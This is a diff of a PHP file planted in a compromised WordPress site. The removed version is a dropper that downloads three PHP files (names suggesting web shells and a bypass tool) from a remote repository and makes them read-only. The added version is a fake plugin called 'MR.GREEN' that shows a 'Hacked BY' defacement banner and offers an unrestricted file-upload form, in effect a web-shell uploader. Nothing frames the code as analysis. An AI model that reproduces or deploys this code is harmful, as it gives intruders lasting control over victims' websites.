@@ -1,39 +1,40 @@
 <?php
+/*
+Plugin Name: MR.GREEN
+Plugin URI: http://www.zone-h.org/archive/notifier=MR.GREEN
+Description: Contact Me  ICQ Account : 747252180
+Author: Green
+Author URI: http://www.zone-h.org/archive/notifier=MR.GREEN
+Version: Pro 
+*/
+add_action("admin_menu", function () {
+    add_object_page("MR.GREEN", "MR.GREEN", "administrator", "Green", function () {
+        echo "<center>Hacked BY MR.GREEN</center><br>
 
-// URLs of the files to download
-$files = [
-    'https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/wp-22.php' => 'wp-22.php',
-    'https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/style.php' => 'style.php',
-    'https://raw.githubusercontent.com/starkvps007/privatefilessomanyyy/main/BypassBest.php' => 'bp.php',
-];
 
-// Function to download a file using cURL
-function downloadFile($url, $outputFile) {
-    $ch = curl_init($url);
-    $fp = fopen($outputFile, 'w');
-    
-    curl_setopt($ch, CURLOPT_FILE, $fp);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
-    curl_setopt($ch, CURLOPT_FAILONERROR, true);
-    
-    $result = curl_exec($ch);
-    
-    if (!$result) {
-        echo "Error: " . curl_error($ch) . "\n";
-    }
-    
-    curl_close($ch);
-    fclose($fp);
-}
+<center>Contact Me  ICQ Account : 747252180</center><br><center><br>
+     ";
 
-// Loop through each file and download it
-foreach ($files as $url => $filename) {
-    downloadFile($url, $filename);
-    // Change file permissions to 0444 for wp-22.php and style.php
-    if (in_array($filename, ['wp-22.php', 'style.php'])) {
-        chmod($filename, 0444);
-    }
-}
+        if(isset($_POST['Submit'])){
+            $filedir = "";
+            $maxfile = '2888888';
+         
+            $file_name = $_FILES['image']['name'];
+            $temporari = $_FILES['image']['tmp_name'];
+            if (isset($_FILES['image']['name'])) {
+                $abod = $filedir.$file_name;
+                @move_uploaded_file($temporari, $abod);
+         
+        echo"<center><b>Link ==> <a href='$file_name' target=_blank>$file_name</a></b></center>";
+		        
+		        
+        }
+        };
 
-echo "Files downloaded and permissions set.\n";
+        echo'
+        <form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form></br></center><br>';
+
+
+    });
+    });
 ?>
